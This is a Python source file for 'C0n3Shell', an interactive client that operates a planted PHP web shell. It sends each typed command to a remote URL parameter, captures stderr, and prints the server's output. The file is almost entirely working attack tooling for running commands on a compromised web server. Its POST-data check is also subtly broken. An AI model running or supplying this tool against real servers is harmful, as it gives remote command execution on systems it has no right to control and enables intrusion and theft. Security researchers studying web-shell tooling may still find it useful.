import requests
from urllib.parse import quote
from lxml import html
from cmd import Cmd

class C0n3Shell(Cmd):

    # Shall we display the raw results ?
    _http_verb = 'get'
    _raw_results=False
    _remote_url=''
    _remote_attribute='cmd'
    _ignore_certs=None
    _headers=None
    _data=None
    # _Cookies=None
    _options = {
        'raw': False,
        'show_stderr':True
    }

    def __init__(
        self,
        http_verb='get',
        remote='http://localhost/shell.php',
        attribute='cmd',
        ignore_certs=False,
        headers=None,
        data=None
        # ,
        # cookies=None
        ):

        self.prompt = 'C0n3 > '
        self._http_verb = http_verb.lower() if http_verb != None and len(http_verb) > 0 else 'get'
        self._remote_url=remote
        self._remote_attribute=attribute
        self._ignore_certs=ignore_certs
        self._headers=headers
        self._data=data
        # self._Cookies=cookies
        Cmd.__init__(self)
        self.showOptions(None)

    def cmdHandler(self,cmd):

        if cmd != None and len(cmd)>0 and cmd.startswith('!'):
            # internal commands
            cmdArray = cmd.split(' ')
            intCmd = cmdArray.pop(0)[1:]
            internal_command_handler = self._internal_commands.get(intCmd)
            if callable(internal_command_handler):
                internal_command_handler(self,' '.join(cmdArray))
            else:
                print('[!] Unknown {}'.format(internal_command_handler))
        else:
            self.sendToShell(cmd)

    def helpCmd(args):
        print('[?] Help: ')

    def sendToShell(self,cmd):
        payload = cmd

        try:
            if self._options['show_stderr']:
                payload = '{} 2>&1'.format(payload)

            print('[!] Sending payload: {}'.format(payload))
            response = requests.request(
                self._http_verb,
                '{}?{}={}'.format(self._remote_url,self._remote_attribute,quote(payload)),
                headers=self._headers,
                data=self._data if self._http_verb in ['post,put'] else None
                )
            # if self._options['raw']:
            print(response.text)
            # else:

        except Exception as ex:
            print('[!] Error: {}'.format(ex))

    # Send command to webshell and display results
    def default(self,args):
        self.cmdHandler(args)

    def setOptions(self,args):
        try:
            args = args.split(' ')
            self._options[args[0]] = args[1]
            print('[V] {}: {}'.format(args[0],args[1]))
        except Exception as ex:
            print('[!] Error: {}'.format(ex))
            print('[!] Usage: set option value')

    def showOptions(self,args):
        print('[!] options:')
        for name, value in self._options.items():
            print("\t{}: {}".format(name,value))

    def quitCmd(self,args):
        quit()

    _internal_commands = {
        'help': helpCmd,
        'h': helpCmd,
        '?': helpCmd,
        'set':  setOptions,
        'options': showOptions,
        # 'put':  uploadFileCmd,
        # 'get':  downloadFileCmd,
        'quit': quitCmd,
        'q': quitCmd
    }
